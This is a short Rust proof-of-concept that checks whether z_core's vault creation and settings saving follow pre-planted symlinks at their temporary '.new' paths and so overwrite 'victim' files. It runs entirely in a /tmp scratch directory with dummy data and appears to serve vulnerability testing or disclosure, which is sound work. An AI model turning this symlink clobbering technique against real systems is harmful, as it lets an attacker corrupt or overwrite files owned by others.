use std::fs;
use std::os::unix::fs::symlink;
use z_core::api;

fn main() {
    let root = "/tmp/zprivacy-symlink-proof";
    let data = format!("{root}/data");
    let vault_victim = format!("{root}/vault-victim.txt");
    let config_victim = format!("{root}/config-victim.txt");
    let _ = fs::remove_dir_all(root);
    fs::create_dir_all(&data).unwrap();
    fs::write(&vault_victim, b"ZXQ-VICTIM-VAULT-ORIGINAL").unwrap();
    fs::write(&config_victim, b"ZXQ-VICTIM-CONFIG-ORIGINAL").unwrap();
    symlink(&vault_victim, format!("{data}/vault.zv.new")).unwrap();
    symlink(&config_victim, format!("{data}/settings.zcfg.new")).unwrap();

    api::set_data_dir(data.clone()).unwrap();
    println!("VAULT_CREATE={:?}", api::vault_create_with_passphrase("ZXQ-passphrase-strong".into()));
    println!("VAULT_VICTIM_AFTER={:?}", fs::read(&vault_victim).unwrap());
    println!("VAULT_PATH_IS_SYMLINK={}", fs::symlink_metadata(format!("{data}/vault.zv")).unwrap().file_type().is_symlink());

    let mut settings = api::settings().unwrap();
    settings.first_run_done = true;
    println!("CONFIG_SAVE={:?}", api::save_settings(settings));
    println!("CONFIG_VICTIM_AFTER={:?}", String::from_utf8_lossy(&fs::read(&config_victim).unwrap()));
    println!("CONFIG_PATH_IS_SYMLINK={}", fs::symlink_metadata(format!("{data}/settings.zcfg")).unwrap().file_type().is_symlink());
}
